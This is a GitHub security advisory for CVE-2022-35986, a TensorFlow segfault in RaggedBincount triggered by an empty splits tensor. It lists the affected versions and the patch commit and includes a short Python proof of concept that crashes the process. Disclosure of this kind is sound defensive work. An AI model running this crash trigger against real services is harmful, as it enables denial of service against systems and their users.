# [M]  TensorFlow vulnerable to segfault in `RaggedBincount`

## Summary
Severity: Medium
Advisory: GHSA-wr9v-g9vf-c74v
CVE: CVE-2022-35986
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-wr9v-g9vf-c74v
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `RaggedBincount` is given an empty input tensor `splits`, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf
binary_output = True
splits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)
values = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.RaggedBincount(splits=splits, values=values, size=size, weights=weights, binary_output=binary_output)
```

### Patches
We have patched the issue in GitHub commit [7a4591fd4f065f4fa903593bc39b2f79530a74b8](https://github.com/tensorflow/tensorflow/commit/7a4591fd4f065f4fa903593bc39b2f79530a74b8).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wr9v-g9vf-c74v
- https://nvd.nist.gov/vuln/detail/CVE-2022-35986
- https://github.com/tensorflow/tensorflow/commit/7a4591fd4f065f4fa903593bc39b2f79530a74b8
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
